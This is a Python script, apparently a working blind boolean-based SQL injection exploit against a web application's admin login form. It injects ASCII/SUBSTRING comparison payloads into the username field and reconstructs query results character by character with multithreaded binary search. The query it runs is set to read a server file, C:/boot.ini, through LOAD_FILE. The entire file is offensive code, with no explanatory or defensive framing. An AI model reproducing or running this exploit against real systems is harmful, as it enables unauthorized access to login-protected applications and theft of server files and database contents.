import requests, argparse, urllib.parse, re, threading, time, os

parser = argparse.ArgumentParser()
parser = argparse.ArgumentParser()

parser.add_argument("-u", "--url",
                    dest="url",
                    action='store', required=True)
parser.add_argument("-t", "--threads", dest="threads", type=int,default=5)
parser.add_argument("--dbg",  action=argparse.BooleanOptionalAction, default=False)
parser.add_argument("--mysql",  action=argparse.BooleanOptionalAction, default=False)
parser.add_argument("--dbl", action=argparse.BooleanOptionalAction, default=False)
parser.add_argument("--tbs",  action=argparse.BooleanOptionalAction, default=False)
parser.add_argument("--clm",  action=argparse.BooleanOptionalAction, default=False)
parser.add_argument("-db", "--database", dest="database" ,default='')
parser.add_argument("-tb", "--table", dest="table", default='')
parser.add_argument("-cl", "--columns", dest="columns", default=[], nargs='+')


args = parser.parse_args()

url = args.url
dbg = args.dbg
mysql = args.mysql
database = args.database
table = args.table
columns = args.columns
dbl = args.dbl
tbs = args.tbs # table schema of database
clm = args.clm # columns of table


## threads
max_threads = args.threads
if(max_threads > 10):
    print("Max threads is 10 to avoid data disruption")
    exit(1)
    
sema = threading.Semaphore(value=max_threads)
threads = list()
thread_number = 0
job_finished = False
#sql = args.sql

temp_data=[''] * 100

main_payload = ''

login_url = f"{url}/admin/login"

headers = { "Content-Type": "application/x-www-form-urlencoded",
            "Origin": f"{url}",
            "Referer": f"{url}/admin/index.php"}


def exploit():
    global main_payload
    ########wyszukwianie baz danych
    main_payload = 'select LOAD_FILE("C:/boot.ini")'
    list_data = list()
            
    offset = 0
    while True:

        if(start_job(offset) == True):
            list_data.append(''.join(temp_data))
            offset += 1
            time.sleep(1)
        else:
            break

        print("List dabatases:")
        for data in list_data:
            print(data)




def start_job(offset):
    global temp_data, job_finished
    temp_data=[''] * 100
    job_number=1
    while True: 

        if(job_finished):       
            while (len(threads) > 0):
                clean_threads()
                time.sleep(0.2)

            print_data(False)
            break

        if(len(threads) >= max_threads):
            clean_threads()

        if(len(threads) < max_threads): 
            thread = threading.Thread(target=get_data,args=(str(job_number),str(offset),))
            threads.append(thread)
            thread.start()
            job_number += 1

        time.sleep(0.2)

    job_finished = False
    if(''.join(temp_data) == ''):
        print("")
        #return False
    else:
        return True


def clean_threads():
    for t in threads:
        if not t.is_alive():
            t.join()#threads.remove(t)
            threads.remove(t)
            #t.join()



def get_data(job_number, offset):
    global job_finished
    sema.acquire()
    letter_number = int(job_number)
    if(word_brute(letter_number, offset) == False):
        job_finished = True
        sema.release()
        return

    sema.release()


def get_payload(letter_number, compare_ch ,snumber, offset):
    global main_payload
    return f'OR ASCII(SUBSTRING(({main_payload} LIMIT 1 OFFSET {offset}), {letter_number}, 1)) {compare_ch} {snumber}'


def check(payload):

    data = { 'username': f'\' {payload}#', 'password': 'asd', 'login': ''}

    encoded_data = urllib.parse.urlencode(data)

    proxy = { 'http': 'http://127.0.0.1:8080' }
    s = requests.Session()
    s.get(login_url)
    r = s.post(login_url,data=encoded_data, proxies=proxy, headers=headers)

    if ("Cannot find" in r.text):
        return False

    if ("Incorrect" in r.text):
        return True


def rev_compare_ch(word):
    if (word == '<'):
        return '>'
    if (word == '>'):
        return '<'

    raise NotImplemented


def print_data(isTemp):
    if(isTemp):
        print(''.join(temp_data), end='\r')
    else:
        print(''.join(temp_data))


def clean_data(letter_number):
    global temp_data
    for i in range(0,len(temp_data)):
        if(i >= letter_number):
            temp_data[i] = ''


def word_brute(letter_number, offset):

    global temp_data
    max_number = 128
    prev_snumber = 128
    snumber = 64
    compare_ch = '<'
    payload = get_payload(letter_number, compare_ch ,snumber, offset)
    stop = False

    with open("dbg.txt", "a") as f:
        while (1):
            if (check(payload)):
                if(snumber < 30):
                    temp_data[letter_number] = ''
                    clean_data(letter_number)
                    return False

                stop = False
                temp_data[letter_number] = chr(snumber)
                print_data(True)

                temp = snumber
                if (compare_ch == '<'):
                    snumber = snumber - int(abs((prev_snumber - snumber) / 2))
                else:
                    snumber = snumber + int(abs((prev_snumber - snumber) / 2))

                prev_snumber = temp

                if(dbg):
                    f.write(str(f"{snumber} "))
            else:
                if (stop):
                    if (int(snumber) >= 31):
                        print_data(True)
                        f.write(str(f"{snumber}\n"))
                        temp_data[letter_number] = chr(snumber)

                        return True
                    else:
                        temp_data[letter_number] = ''
                        return False

                compare_ch = rev_compare_ch(compare_ch)
                max_number = prev_snumber
                stop = True

            payload = get_payload(letter_number, compare_ch ,snumber ,offset)


exploit()